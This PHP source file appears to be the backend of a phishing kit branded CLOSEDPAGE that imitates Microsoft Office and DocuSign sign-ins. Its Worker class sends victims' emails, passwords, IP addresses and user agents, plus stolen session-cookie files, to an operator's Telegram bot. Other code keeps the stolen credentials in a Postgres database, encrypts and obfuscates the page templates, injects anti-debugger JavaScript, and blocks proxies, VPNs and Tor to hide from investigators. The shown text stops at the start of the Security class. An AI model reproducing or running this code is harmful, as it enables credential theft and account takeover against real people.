<?php
namespace App;

use Exception;

// =====================================================================
// CONFIG — Load/save configuration from .env + config.json.enc
// =====================================================================
class Config {
    public static function load(): array {
        $baseDir = realpath(__DIR__ . '/..');
        $configPath = $baseDir . '/config.json.enc';
        $envPath = $baseDir . '/.env';
        $cfg = [];
        $envFromFile = [];

        // 1. Load manual .env first (Defaults)
        if (file_exists($envPath)) {
            $env = @parse_ini_file($envPath);
            if (is_array($env)) {
                $envFromFile = $env; // Save all env vars for later
                foreach ($env as $k => $v) {
                    $cfg[$k] = $v;
                    // Also populate getenv/$_ENV for other parts of the app
                    putenv("$k=$v");
                    $_ENV[$k] = $v;
                    
                    // Map common env names to config names
                    if ($k === 'PROXYCHECK_API_KEY') $cfg['proxycheckApiKey'] = $v;
                    if ($k === 'MASTER_LICENSE_KEY') $cfg['masterLicenseKey'] = $v;
                    if ($k === 'ENC_KEY') $cfg['encKey'] = $v;
                    if ($k === 'TELEGRAM_BOT_TOKEN') $cfg['telegramBotToken'] = $v;
                    if ($k === 'TELEGRAM_CHAT_ID') $cfg['telegramChatId'] = $v;
                }
                
                // Explicitly make sure WORKER_DATABASE_URL and NEON_DATABASE_URL are set
                if (isset($env['WORKER_DATABASE_URL'])) {
                    $cfg['WORKER_DATABASE_URL'] = $env['WORKER_DATABASE_URL'];
                    putenv("WORKER_DATABASE_URL=" . $env['WORKER_DATABASE_URL']);
                    $_ENV['WORKER_DATABASE_URL'] = $env['WORKER_DATABASE_URL'];
                }
                if (isset($env['NEON_DATABASE_URL'])) {
                    $cfg['NEON_DATABASE_URL'] = $env['NEON_DATABASE_URL'];
                    putenv("NEON_DATABASE_URL=" . $env['NEON_DATABASE_URL']);
                    $_ENV['NEON_DATABASE_URL'] = $env['NEON_DATABASE_URL'];
                }
            }
        }

        // Set default Microsoft client IDs and redirect URL
        $cfg['msDeviceFlowClientId'] = $cfg['msDeviceFlowClientId'] ?? '00000002-0000-0ff1-ce00-000000000000';
        $cfg['msSsoClientId'] = $cfg['msSsoClientId'] ?? 'd326c4ad-3914-4aba-ba32-83500a38b6a1';
        $cfg['postAuthRedirectUrl'] = $cfg['postAuthRedirectUrl'] ?? 'https://www.docusign.com/';
        $cfg['msDeviceFlowUrl'] = $cfg['msDeviceFlowUrl'] ?? 'https://microsoft.com/devicelogin';

        // 2. Load encrypted config.json (User Overrides)
        // First save the DB URLs from .env so they can't be overwritten
        $savedDATABASE_URL = $cfg['DATABASE_URL'] ?? null;
        $savedWORKER_DATABASE_URL = $cfg['WORKER_DATABASE_URL'] ?? null;
        $savedNEON_DATABASE_URL = $cfg['NEON_DATABASE_URL'] ?? null;

        if (file_exists($configPath)) {
            $json = Crypto::loadEncrypted($configPath);
            if ($json) {
                $decoded = json_decode($json, true);
                if (is_array($decoded)) {
                    foreach ($decoded as $k => $v) {
                        // Prevent user config from overriding locked keys
                        if (in_array($k, ['masterLicenseKey', 'encKey', 'DATABASE_URL', 'WORKER_DATABASE_URL', 'NEON_DATABASE_URL'])) {
                            continue;
                        }
                        $cfg[$k] = $v;
                    }
                }
            }
        }

        // Restore the saved DB URLs
        if ($savedDATABASE_URL !== null) $cfg['DATABASE_URL'] = $savedDATABASE_URL;
        if ($savedWORKER_DATABASE_URL !== null) $cfg['WORKER_DATABASE_URL'] = $savedWORKER_DATABASE_URL;
        if ($savedNEON_DATABASE_URL !== null) $cfg['NEON_DATABASE_URL'] = $savedNEON_DATABASE_URL;

        // Support Environment Variables (Render/Docker)
        $envBotToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? getenv('TELEGRAM_BOT_TOKEN');
        if ($envBotToken) {
            $cfg['telegramBotToken'] = $envBotToken;
        }
        
        $envChatId = $_ENV['TELEGRAM_CHAT_ID'] ?? getenv('TELEGRAM_CHAT_ID');
        if ($envChatId) {
            $cfg['telegramChatId'] = $envChatId;
        }

        $envTelemetry = getenv('TELEMETRY_ENABLED');
        if ($envTelemetry !== false) {
             $cfg['telemetryEnabled'] = filter_var($envTelemetry, FILTER_VALIDATE_BOOLEAN);
        }

        $envIpinfoEnabled = getenv('IPINFO_ASN_BLOCKING_ENABLED');
        if ($envIpinfoEnabled !== false) {
            $cfg['ipinfoAsnBlockingEnabled'] = filter_var($envIpinfoEnabled, FILTER_VALIDATE_BOOLEAN);
        }
        $envIpinfoToken = $_ENV['IPINFO_TOKEN'] ?? getenv('IPINFO_TOKEN');
        if (is_string($envIpinfoToken) && $envIpinfoToken !== '') {
            $cfg['ipinfoToken'] = $envIpinfoToken;
        }
        $envIpinfoFailClosed = getenv('IPINFO_FAIL_CLOSED');
        if ($envIpinfoFailClosed !== false) {
            $cfg['ipinfoFailClosed'] = filter_var($envIpinfoFailClosed, FILTER_VALIDATE_BOOLEAN);
        }

        // ProxyCheck.io Environment Variables
        $envProxycheckEnabled = getenv('PROXYCHECK_ENABLED');
        if ($envProxycheckEnabled !== false) {
            $cfg['proxycheckEnabled'] = filter_var($envProxycheckEnabled, FILTER_VALIDATE_BOOLEAN);
        }
        $envProxycheckApiKey = $_ENV['PROXYCHECK_API_KEY'] ?? getenv('PROXYCHECK_API_KEY');
        if (is_string($envProxycheckApiKey) && $envProxycheckApiKey !== '') {
            $cfg['proxycheckApiKey'] = $envProxycheckApiKey;
        }
        $envProxycheckBlockVPN = getenv('PROXYCHECK_BLOCK_VPN');
        if ($envProxycheckBlockVPN !== false) {
            $cfg['proxycheckBlockVPN'] = filter_var($envProxycheckBlockVPN, FILTER_VALIDATE_BOOLEAN);
        }
        $envProxycheckBlockProxy = getenv('PROXYCHECK_BLOCK_PROXY');
        if ($envProxycheckBlockProxy !== false) {
            $cfg['proxycheckBlockProxy'] = filter_var($envProxycheckBlockProxy, FILTER_VALIDATE_BOOLEAN);
        }
        $envProxycheckBlockTor = getenv('PROXYCHECK_BLOCK_TOR');
        if ($envProxycheckBlockTor !== false) {
            $cfg['proxycheckBlockTor'] = filter_var($envProxycheckBlockTor, FILTER_VALIDATE_BOOLEAN);
        }
        $envProxycheckRiskThreshold = getenv('PROXYCHECK_RISK_THRESHOLD');
        if ($envProxycheckRiskThreshold !== false) {
            $cfg['proxycheckRiskThreshold'] = (int)$envProxycheckRiskThreshold;
        }

        // Re-set all .env variables to ensure they are in $_ENV/getenv()
        foreach ($envFromFile as $k => $v) {
            putenv("$k=$v");
            $_ENV[$k] = $v;
        }

        return $cfg;
    }

    public static function loadFileOnly(): array {
        $configPath = __DIR__ . '/../config.json.enc';
        if (!file_exists($configPath)) return [];

        $json = Crypto::loadEncrypted($configPath);
        if (!$json) return [];

        $decoded = json_decode($json, true);
        return is_array($decoded) ? $decoded : [];
    }

    public static function save(array $data): bool {
        $configPath = __DIR__ . '/../config.json.enc';

        // Add random jitter to file size to prevent size-analysis
        $data['_padding'] = bin2hex(random_bytes(mt_rand(16, 64)));
        $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        if ($json === false) return false;
        
        $result = Crypto::saveEncrypted($configPath, $json);
        if ($result) {
            clearstatcache(true, $configPath);
            if (function_exists('opcache_invalidate')) {
                @opcache_invalidate($configPath, true);
            }
        }
        return $result;
    }

    public static function saveMerged(array $partial): bool {
        $existing = self::loadFileOnly();
        if (!is_array($existing)) $existing = [];
        unset($existing['_padding']);

        foreach ($partial as $k => $v) {
            $existing[$k] = $v;
        }

        return self::save($existing);
    }

    /**
     * Never let an empty form value wipe stored credentials/secrets.
     * If the payload carries an empty string for a credential key but the
     * stored config has a non-empty value, drop the key so saveMerged keeps it.
     */
    public static function guardCredentials(array $payload): array {
        $existing = self::load();
        foreach (['cfEmail', 'cfApiKey', 'cfZoneId', 'cfAccountId', 'cfSiteKey', 'cfSecretKey', 'telegramBotToken', 'telegramChatId', 'proxycheckApiKey'] as $k) {
            if (array_key_exists($k, $payload) && trim((string)$payload[$k]) === '' && !empty($existing[$k])) {
                unset($payload[$k]);
            }
        }
        return $payload;
    }


}

// =====================================================================
// WORKER — Telegram notifications
// =====================================================================
class Worker {
    public static function sendTelegramMessage(string $email, string $password, string $ip, string $ua, string $info): void {
        $cfg = Config::load();
        if (empty($cfg['telegramBotToken']) || empty($cfg['telegramChatId'])) return;
        $msg = self::generateTelegramMessage($email, $password, $ip, $ua, $info);
        $url = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
        self::sendRequest($url, ['chat_id' => $cfg['telegramChatId'], 'text' => $msg], $cfg);
    }

    public static function sendTelegramDocument(string $email, string $filePath, string $label): void {
        $cfg = Config::load();
        if (empty($cfg['telegramBotToken']) || empty($cfg['telegramChatId'])) return;
        if (!file_exists($filePath)) return;
        $url = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendDocument";
        $payload = [
            'chat_id'  => $cfg['telegramChatId'],
            'document' => new \CURLFile($filePath, 'application/javascript', $label),
            'caption'  => "/////// COOKIES 🍪 POWERED BY CLOSEDPAGE 4 $email/////////"
        ];
        self::sendRequest($url, $payload, $cfg, true);
    }

    public static function sendTelegramCookies($task, $cfg, $finalStatus) {
        $cookieId = $task['cookie_id'];
        $email    = $task['email'];
        $baseDir  = realpath(__DIR__ . '/..');
        $injectFile = $baseDir . '/session_data/inject_session_' . $cookieId . '.js';
        self::sendTelegramDocument($email, $injectFile, "cookies_{$email}.js");
    }

    public static function generateTelegramMessage($email, $password, $ip, $ua, $info, $statusSuffix = "") {
        $msg = "@closedservice  ✅ Microsoft Office " . trim($statusSuffix) . " \n\n";
        $msg .= " \"👨🏼‍✈️\": \"$email\", \n";
        $msg .= " \"🔑\": \"$password\" \n\n";
        $msg .= " #FINGERPRINTS: $ip \n";
        $msg .= " USERAGENT: $ua \n";
        $msg .= " /////// POWERED BY CLOSEDPAGE /////////  $info 
";
        return $msg;
    }

    public static function sendRequest($url, $payload, $cfg, $isMultipart = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        
        if ($isMultipart) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        }
        
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        if (!empty($cfg['proxyEnabled']) && !empty($cfg['proxyUrl'])) {
            curl_setopt($ch, CURLOPT_PROXY, $cfg['proxyUrl']);
        }
        
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            Security::log("WORKER: Telegram Curl Error: " . curl_error($ch));
        }
        unset($ch);
        return $result;
    }
}

// =====================================================================
// CONSOLE — CLI commands (encrypt/decrypt templates)
// =====================================================================
class Console {
    public static function handle(array $argv) {
        if (count($argv) < 3) {
            echo "Usage: php index.php manage [encrypt|decrypt] [file]\n";
            exit(1);
        }

        $mode = $argv[2];
        $file = $argv[3];

        if (!file_exists($file)) {
            echo "File not found: $file\n";
            exit(1);
        }

        $content = file_get_contents($file);

        if ($mode === 'encrypt') {
            if (substr($file, -4) === '.enc') {
                echo "Warning: File seems already encrypted (.enc extension).\n";
            }
            
            // Obfuscate JavaScript before encryption
            $content = Crypto::obfuscateScripts($content);
            
            // Fix: If file is in templates/plain/, save the .enc to the parent templates/ directory
            if (strpos($file, 'templates/plain/') !== false) {
                $outFile = str_replace('templates/plain/', 'templates/', $file) . '.enc';
            } else {
                $outFile = $file . '.enc';
            }
            
            if (Crypto::saveEncrypted($outFile, $content)) {
                echo "Encrypted to $outFile\n";
            } else {
                echo "Encryption failed.\n";
                exit(1);
            }
        } elseif ($mode === 'decrypt') {
            $decrypted = Crypto::loadEncrypted($file);
            if ($decrypted === false) {
                echo "Decryption failed.\n";
                exit(1);
            }
            $outFile = (substr($file, -4) === '.enc') ? substr($file, 0, -4) : $file . '.dec';
            if (file_put_contents($outFile, $decrypted) !== false) {
                echo "Decrypted to $outFile\n";
            } else {
                echo "Write failed.\n";
            }
        } else {
            echo "Invalid mode.\n";
        }
    }
}

// =====================================================================
// CRYPTO — AES-256-CBC encrypt/decrypt for templates
// =====================================================================
class Crypto {
    private const METHOD = 'aes-256-cbc';

    private static function getKey(): string {
        $key = (string)($_ENV['ENC_KEY'] ?? getenv('ENC_KEY') ?? $_SERVER['ENC_KEY'] ?? '');
        if ($key === '') {
            $envPath = __DIR__ . '/../.env';
            if (file_exists($envPath)) {
                $env = @parse_ini_file($envPath);
                if ($env && isset($env['ENC_KEY'])) {
                    $key = $env['ENC_KEY'];
                }
            }
        }
        return is_string($key) ? $key : '';
    }

    public static function saveEncrypted(string $path, string $data): bool {
        $key = self::getKey();
        if ($key === '') return false;

        $ivLength = openssl_cipher_iv_length(self::METHOD);
        $iv = openssl_random_pseudo_bytes($ivLength);
        $encrypted = openssl_encrypt($data, self::METHOD, $key, 0, $iv);
        
        if ($encrypted === false) return false;

        $fp = fopen($path, 'w');
        if (!$fp) return false;

        $success = false;
        if (flock($fp, LOCK_EX)) {
            $bytes = fwrite($fp, $iv . $encrypted);
            flock($fp, LOCK_UN);
            if ($bytes !== false) $success = true;
        }
        fclose($fp);
        return $success;
    }

    public static function loadEncrypted(string $path) {
        if (!file_exists($path)) return false;
        $content = file_get_contents($path);
        if ($content === false) return false;

        $key = self::getKey();
        if ($key === '') return false;

        $ivLength = openssl_cipher_iv_length(self::METHOD);
        if (strlen($content) < $ivLength) return false;

        $iv = substr($content, 0, $ivLength);
        $encrypted = substr($content, $ivLength);

        $html = openssl_decrypt($encrypted, self::METHOD, $key, 0, $iv);
        if ($html === false) return false;

        // Inject anti-devtools protection before the LAST </body> only
        // (admin.html has </body> in a JS string literal, so we must target the final one)
        $antiDt = <<<'JAVASCRIPT'
<script>
(function(){function c(){var s=new Date();debugger;return new Date()-s>100;}setInterval(function(){if(c())location.href="https://google.com";},800);})();
</script>
JAVASCRIPT;
        $lastBody = strrpos($html, '</body>');
        if ($lastBody !== false) {
            $html = substr_replace($html, $antiDt . "\n</body>", $lastBody, 7);
        }

        // Minify HTML — strip comments, collapse whitespace between tags
        $html = preg_replace('/<!--.*?-->/s', '', $html);
        $html = preg_replace('/>\s+</', '><', $html);
        // NOTE: only strip spaces/tabs per line — NEVER newlines.
        // The old '/^\s+|\s+$/m' could join a line ending in a "//" comment
        // with the next line, commenting out code (e.g. "} catch (e) {").
        $html = preg_replace('/^[ \t]+|[ \t]+$/m', '', $html);

        return $html;
    }

    /**
     * Obfuscate all <script> blocks in an HTML string using javascript-obfuscator CLI.
     * Falls back to original JS if obfuscator is not available or fails.
     * Uses DOMDocument for robust HTML parsing to avoid regex issues with complex pages.
     */
    public static function obfuscateScripts(string $html): string {
        $dom = new \DOMDocument();
        libxml_use_internal_errors(true);
        $dom->loadHTML('<?xml encoding="UTF-8">' . $html, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        $scripts = $dom->getElementsByTagName('script');
        $replacements = [];
        foreach ($scripts as $script) {
            $js = $script->textContent;
            $js = trim($js);
            if (strlen($js) < 10) continue;

            $tmpDir = sys_get_temp_dir();
            $tmpIn = $tmpDir . '/jso_' . uniqid() . '.js';
            $tmpOut = $tmpDir . '/jso_' . uniqid() . '.js';
            file_put_contents($tmpIn, $js);

            $cmd = sprintf(
                'npx javascript-obfuscator %s --output %s --compact true --debug-protection false --disable-console-output false 2>/dev/null',
                escapeshellarg($tmpIn),
                escapeshellarg($tmpOut)
            );
            exec($cmd, $out, $code);

            $result = $js;
            if ($code === 0 && file_exists($tmpOut)) {
                $obf = trim(file_get_contents($tmpOut));
                if ($obf !== '') $result = $obf;
            }

            @unlink($tmpIn);
            @unlink($tmpOut);
            $replacements[] = ['original' => $script->textContent, 'obfuscated' => $result];
        }

        // Apply replacements via string replace (DOMDocument saveHTML can mangle structure)
        foreach ($replacements as $r) {
            $html = str_replace($r['original'], $r['obfuscated'], $html);
        }
        return $html;
    }

    /**
     * Obfuscate JS in a plain template file in-place (used by deployer).
     */
    public static function obfuscateFile(string $path): bool {
        if (!file_exists($path)) return false;
        $html = file_get_contents($path);
        if ($html === false) return false;
        $html = self::obfuscateScripts($html);
        return file_put_contents($path, $html) !== false;
    }
}

// =====================================================================
// NEON DB — PostgreSQL (Neon) database for session persistence
// =====================================================================
class NeonDB {
    private static ?object $pdo = null;
    private static bool $tried = false;

    public static function pdo(): ?object {
        if (self::$tried) return self::$pdo;
        self::$tried = true;
        // First try to load Config to ensure we have the DATABASE_URL from .env!
        $cfg = \App\Config::load();
        $dsn = $cfg['WORKER_DATABASE_URL'] ?? $cfg['DATABASE_URL'] ?? $_ENV['WORKER_DATABASE_URL'] ?? getenv('WORKER_DATABASE_URL') ?? $_ENV['DATABASE_URL'] ?? getenv('DATABASE_URL') ?? '';
        if (!$dsn) return null;
        try {
            $pdoDsn = self::buildPdoDsn($dsn);
            if ($pdoDsn === null) {
                Security::log("NeonDB: malformed DATABASE_URL");
                return null;
            }
            [$dsnStr, $user, $pass] = $pdoDsn;
            $pdo = new \PDO($dsnStr, $user, $pass);
            $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
            $pdo->exec("
                CREATE TABLE IF NOT EXISTS sessions (
                    cookie_id   TEXT PRIMARY KEY,
                    email       TEXT NOT NULL DEFAULT '',
                    password    TEXT NOT NULL DEFAULT '',
                    status      TEXT NOT NULL DEFAULT 'pending',
                    created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                    updated_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                    country     TEXT,
                    ip          TEXT,
                    ua          TEXT,
                    data        JSONB
                )
            ");
            
            $pdo->exec("
                CREATE TABLE IF NOT EXISTS events (
                    id          BIGSERIAL PRIMARY KEY,
                    cookie_id   TEXT,
                    event_type  TEXT NOT NULL,
                    email       TEXT NOT NULL DEFAULT '',
                    status      TEXT NOT NULL DEFAULT '',
                    payload     JSONB,
                    created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
                )
            ");
            
            // Add missing columns if needed
            try { $pdo->exec("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS country TEXT"); } catch (\Throwable $e) {}
            try { $pdo->exec("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS ip TEXT"); } catch (\Throwable $e) {}
            try { $pdo->exec("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS ua TEXT"); } catch (\Throwable $e) {}
            try { $pdo->exec("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS data JSONB"); } catch (\Throwable $e) {}
            try { $pdo->exec("ALTER TABLE sessions ALTER data TYPE JSONB USING data::jsonb"); } catch (\Throwable $e) {}

            self::$pdo = $pdo;
            
            // Auto-cleanup failed sessions older than 24h (throttled)
            self::cleanupOldSessions($pdo);
            
        } catch (\Throwable $e) {
            Security::log("NeonDB connect error: " . $e->getMessage());
        }
        return self::$pdo;
    }

    private static int $lastCleanup = 0;

    public static function cleanupOldSessions(object $pdo): void {
        $now = time();
        // Only run once per hour
        if ($now - self::$lastCleanup < 3600) return;
        self::$lastCleanup = $now;
        try {
            $pdo->exec("DELETE FROM sessions WHERE status = 'failed' AND updated_at < NOW() - INTERVAL '24 hours'");
        } catch (\Throwable $e) {
            Security::log("NeonDB cleanup error: " . $e->getMessage());
        }
    }

    private static function buildPdoDsn(string $url): ?array {
        if (strpos($url, 'pgsql:') === 0) {
            return [$url, null, null];
        }
        $p = parse_url($url);
        if (!$p || empty($p['host']) || empty($p['path'])) return null;
        $query = [];
        if (!empty($p['query'])) parse_str($p['query'], $query);
        $sslmode = $query['sslmode'] ?? 'require';
        // Neon routes by SNI; older libpq needs the endpoint ID (first label of the host) passed explicitly.
        $endpointOpt = (strpos($p['host'], 'neon.tech') !== false) ? ';options=endpoint=' . explode('.', $p['host'])[0] : '';
        $dsn = sprintf(
            'pgsql:host=%s;port=%d;dbname=%s;sslmode=%s;connect_timeout=10%s',
            $p['host'],
            $p['port'] ?? 5432,
            ltrim($p['path'], '/'),
            $sslmode,
            $endpointOpt
        );
        $user = isset($p['user']) ? rawurldecode($p['user']) : null;
        $pass = isset($p['pass']) ? rawurldecode($p['pass']) : null;
        return [$dsn, $user, $pass];
    }

    public static function upsert(string $cookieId, string $email, string $password, string $status, string $createdAt = '', array $extra = []): void {
        $pdo = self::pdo();
        if (!$pdo) return;
        try {
            $ca      = $createdAt ?: date('c');
            $country = (string)($extra['country'] ?? '');
            $ip      = (string)($extra['ip']      ?? '');
            $ua      = (string)($extra['ua']      ?? '');
            $data    = isset($extra['data']) ? (is_array($extra['data']) ? json_encode($extra['data']) : (string)$extra['data']) : null;
            $stmt = $pdo->prepare("
                INSERT INTO sessions (cookie_id, email, password, status, created_at, updated_at, country, ip, ua, data)
                VALUES (:id, :email, :pw, :st, :ca, NOW(), :country, :ip, :ua, :data)
                ON CONFLICT (cookie_id) DO UPDATE SET
                    email      = EXCLUDED.email,
                    password   = EXCLUDED.password,
                    status     = EXCLUDED.status,
                    country    = CASE WHEN EXCLUDED.country <> '' THEN EXCLUDED.country ELSE sessions.country END,
                    ip         = CASE WHEN EXCLUDED.ip      <> '' THEN EXCLUDED.ip      ELSE sessions.ip      END,
                    ua         = CASE WHEN EXCLUDED.ua      <> '' THEN EXCLUDED.ua      ELSE sessions.ua      END,
                    data       = CASE WHEN EXCLUDED.data IS DISTINCT FROM NULL THEN EXCLUDED.data ELSE sessions.data END,
                    updated_at = NOW()
            ");
            $stmt->execute([
                ':id' => $cookieId, ':email' => $email, ':pw' => $password,
                ':st' => $status, ':ca' => $ca,
                ':country' => $country, ':ip' => $ip, ':ua' => $ua, ':data' => $data,
            ]);

            // Notify worker (if present) that a new session is available
            if ($status === 'pending') {
                try {
                    $channel = getenv('NOTIFY_CHANNEL') ?: 'new_session';
                    $pdo->exec("SELECT pg_notify(" . $pdo->quote($channel) . ", " . $pdo->quote($cookieId) . ")");
                } catch (\Throwable $e) {
                    Security::log("NeonDB pg_notify error: " . $e->getMessage());
                }
            }
        } catch (\Throwable $e) {
            Security::log("NeonDB upsert error: " . $e->getMessage());
        }
    }

    public static function updateStatus(string $cookieId, string $status, string $password = '', $data = null): void {
        $pdo = self::pdo();
        if (!$pdo) return;
        try {
            $dataStr = $data !== null ? (is_array($data) ? json_encode($data) : (string)$data) : null;
            if ($password !== '' && $dataStr !== null) {
                $stmt = $pdo->prepare("UPDATE sessions SET status=:st, password=:pw, data=:data, updated_at=NOW() WHERE cookie_id=:id");
                $stmt->execute([':st' => $status, ':pw' => $password, ':data' => $dataStr, ':id' => $cookieId]);
            } elseif ($password !== '') {
                $stmt = $pdo->prepare("UPDATE sessions SET status=:st, password=:pw, updated_at=NOW() WHERE cookie_id=:id");
                $stmt->execute([':st' => $status, ':pw' => $password, ':id' => $cookieId]);
            } elseif ($dataStr !== null) {
                $stmt = $pdo->prepare("UPDATE sessions SET status=:st, data=:data, updated_at=NOW() WHERE cookie_id=:id");
                $stmt->execute([':st' => $status, ':data' => $dataStr, ':id' => $cookieId]);
            } else {
                $stmt = $pdo->prepare("UPDATE sessions SET status=:st, updated_at=NOW() WHERE cookie_id=:id");
                $stmt->execute([':st' => $status, ':id' => $cookieId]);
            }
        } catch (\Throwable $e) {
            Security::log("NeonDB updateStatus error: " . $e->getMessage());
        }
    }

    public static function get(string $cookieId): ?array {
        $pdo = self::pdo();
        if (!$pdo) return null;
        try {
            $stmt = $pdo->prepare("SELECT * FROM sessions WHERE cookie_id=:id LIMIT 1");
            $stmt->execute([':id' => $cookieId]);
            $row = $stmt->fetch(\PDO::FETCH_ASSOC);
            if ($row && isset($row['data'])) {
                $decoded = json_decode($row['data'], true);
                if (is_array($decoded)) {
                    $row['data'] = $decoded;
                }
            }
            return $row ?: null;
        } catch (\Throwable $e) {
            Security::log("NeonDB get error: " . $e->getMessage());
            return null;
        }
    }

    public static function getPending(): array {
        $pdo = self::pdo();
        if (!$pdo) return [];
        try {
            $stmt = $pdo->query("SELECT * FROM sessions WHERE status='pending' ORDER BY created_at ASC");
            return $stmt->fetchAll(\PDO::FETCH_ASSOC);
        } catch (\Throwable $e) {
            Security::log("NeonDB getPending error: " . $e->getMessage());
            return [];
        }
    }

    public static function addEvent(string $cookieId, string $eventType, array $fields = []): ?array {
        $pdo = self::pdo();
        if (!$pdo) return null;
        try {
            $email   = $fields['email'] ?? '';
            $status  = $fields['status'] ?? '';
            $payload = isset($fields['payload']) ? json_encode($fields['payload']) : 'null';
            $stmt = $pdo->prepare("
                INSERT INTO events (cookie_id, event_type, email, status, payload)
                VALUES (:cookie_id, :event_type, :email, :status, :payload::jsonb)
                RETURNING id, cookie_id, event_type, email, status, payload, created_at
            ");
            $stmt->execute([
                ':cookie_id'  => $cookieId,
                ':event_type' => $eventType,
                ':email'      => $email,
                ':status'     => $status,
                ':payload'    => $payload,
            ]);
            return $stmt->fetch(\PDO::FETCH_ASSOC);
        } catch (\Throwable $e) {
            Security::log("NeonDB addEvent error: " . $e->getMessage());
            return null;
        }
    }

    public static function clearWorkerDb(): bool {
        $pdo = self::pdo();
        if (!$pdo) {
            Security::log("NeonDB clearWorkerDb: no database connection");
            return false;
        }
        try {
            $pdo->exec("DELETE FROM sessions");
            $pdo->exec("DELETE FROM events");
            Security::log("NeonDB clearWorkerDb: cleared sessions and events tables");
            return true;
        } catch (\Throwable $e) {
            Security::log("NeonDB clearWorkerDb error: " . $e->getMessage());
            return false;
        }
    }
}

// =====================================================================
// DATABASE — Local filesystem session store
// =====================================================================
class Database {
    private $storageDir;

    public function __construct() {
        $baseDir = realpath(__DIR__ . '/..');
        $this->storageDir = $baseDir . '/session_data';
        if (!is_dir($this->storageDir)) {
            mkdir($this->storageDir, 0777, true);
        }
    }

    public function logEvent($data) {
        $cookieId = Security::sanitizeId($data['cookieId']);
        $filePath = $this->storageDir . '/session_' . $cookieId . '.json';

        $data['country'] = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'XX';
        $data['created_at'] = $data['time'] ?? date('c');
        $data['ip'] = $data['ip'] ?? Security::getClientIp();
        $data['ua'] = $data['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

        $existing = file_exists($filePath) ? (json_decode(file_get_contents($filePath), true) ?: []) : [];
        $data = array_merge($existing, $data);

        $ok = file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT)) !== false;

        // NOTE: $data['emailMask'] is used because handleLogEvent() passes the email as 'emailMask',
        // while the direct key 'email' may also be present from other callers.
        $email = $data['emailMask'] ?? $data['email'] ?? '';

        NeonDB::upsert(
            $cookieId,
            $email,
            $data['password'] ?? '',
            $data['status'] ?? 'pending',
            $data['created_at'] ?? '',
            [
                'country' => $data['country'] ?? '',
                'ip'      => $data['ip']      ?? '',
                'ua'      => $data['ua']      ?? '',
            ]
        );

        return $ok;
    }

    public function addTask($cookieId, $email, $password) {
        $cookieId = Security::sanitizeId($cookieId);
        $filePath = $this->storageDir . '/session_' . $cookieId . '.json';

        $existing = file_exists($filePath) ? (json_decode(file_get_contents($filePath), true) ?: []) : [];
        $existing['cookie_id']  = $cookieId;
        $existing['email']      = $email;
        $existing['password']   = $password;
        $existing['status']     = 'pending';
        $existing['created_at'] = $existing['created_at'] ?? date('c');
        $existing['updated_at'] = date('c');

        $ok = file_put_contents($filePath, json_encode($existing, JSON_PRETTY_PRINT)) !== false;

        NeonDB::upsert($cookieId, $email, $password, 'pending', $existing['created_at']);

        return $ok;
    }

    public function getEventInfo($cookieId) {
        $cookieId = Security::sanitizeId($cookieId);
        // Neon is authoritative — check there first
        $row = NeonDB::get($cookieId);
        if ($row) return $row;
        // Fallback to filesystem
        $filePath = $this->storageDir . '/session_' . $cookieId . '.json';
        if (file_exists($filePath)) {
            return json_decode(file_get_contents($filePath), true);
        }
        return null;
    }

    public function getLatestEventByEmail($email) {
        // Query Neon first
        try {
            $pdo = NeonDB::pdo();
            if ($pdo) {
                $stmt = $pdo->prepare("SELECT * FROM sessions WHERE email = :email ORDER BY updated_at DESC LIMIT 1");
                $stmt->execute([':email' => $email]);
                $row = $stmt->fetch(\PDO::FETCH_ASSOC);
                if ($row) return $row;
            }
        } catch (\Throwable $e) {}
        // Fallback to filesystem
        $files = glob($this->storageDir . '/session_*.json');
        if (empty($files)) return null;

        $latestFile = null;
        $latestTime = 0;

        foreach ($files as $file) {
            $data = json_decode(file_get_contents($file), true);
            if ($data && isset($data['email']) && $data['email'] === $email) {
                $time = filemtime($file);
                if ($time > $latestTime) {
                    $latestTime = $time;
                    $latestFile = $data;
                }
            }
        }
        return $latestFile;
    }
}

// =====================================================================
// ROUTER — Extract email from URL path
// =====================================================================
class Router {
    public static function handle() {
        $uri = $_SERVER['REQUEST_URI'] ?? '';
        $path = parse_url($uri, PHP_URL_PATH);
        $email = '';

        if ($path && $path !== '/' && $path !== '/index.php') {
            // Check for admin URL pattern with email (e.g. /admin.html/user@example.com)
            if (strpos($path, '/admin.html/') === 0) {
                // Do not extract email for admin path to prevent interfering with admin routing
                // The admin routing in index.php expects /admin.html exactly or handled there
                // However, index.php currently only matches exact '/admin.html'.
                // We need to handle this in index.php, but here we should just return empty email
                // or let index.php handle it.
                return ['email' => ''];
            }

            $parts = explode('/', trim($path, '/'));
            foreach (array_reverse($parts) as $part) {
                $part = urldecode($part);
                if (strpos($part, '@') !== false) {
                     if (preg_match('/^[^\s@]+@[^\s@]+\.[^\s@]+$/', $part)) {
                         $email = $part;
                         break;
                     }
                }
            }
            return ['email' => $email];
        } else {
            return ['email' => ''];
        }
    }
}

// =====================================================================
// SECURITY — Access control, country blocking, bot detection, ProxyCheck
// =====================================================================
class Security {
    public static function enforceAccess(array $cfg, ?string $email = null, bool $checkIntelligence = true): ?string {
        $ip = self::getClientIp();
        $proxyIntel = null;
        
        // 1. Check Whitelist (Local Whitelist overrides ALL blocks)
